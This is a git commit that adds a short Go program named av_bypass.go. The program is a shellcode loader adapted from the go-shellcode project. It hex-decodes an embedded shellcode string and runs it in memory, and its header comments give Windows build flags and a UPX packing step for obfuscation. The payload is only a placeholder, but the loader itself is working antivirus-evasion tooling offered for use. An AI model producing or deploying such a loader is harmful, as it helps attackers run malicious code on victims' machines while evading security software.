f92220c3220f27d4437544650c9fc39b8d0ff955
kymb0 <55473161+kymb0@users.noreply.github.com>
2021-01-26 19:11:05 +0930

    Create av_bypass.go

---
+++ av_bypass.go
@@ -0,0 +1,30 @@
+//compile: GOOS=windows GOARCH=amd64 go build
+//obfuscate: upx compress sc.exe --brute
+
+package main
+
+import (
+	"encoding/hex"
+	"fmt"
+	"os"
+
+	shellcode "github.com/brimstone/go-shellcode"
+)
+
+// This is the main.go for https://github.com/brimstone/go-shellcode/. Full code should be taken from there, and full credit to Brimstone for the fine work.
+
+func main() {
+
+	//if len(os.Args) != 2 {
+	//	fmt.Printf("Must have shellcode\n")
+	//	os.Exit(1)
+	//}
+	sc :="SHELLCODE-GOES-HERE"
+	sc_bin, err := hex.DecodeString(sc)
+	if err != nil {
+		fmt.Printf("Error decoding arg 1: %s\n", err)
+		os.Exit(1)
+	}
+
+	shellcode.Run(sc_bin)
+}
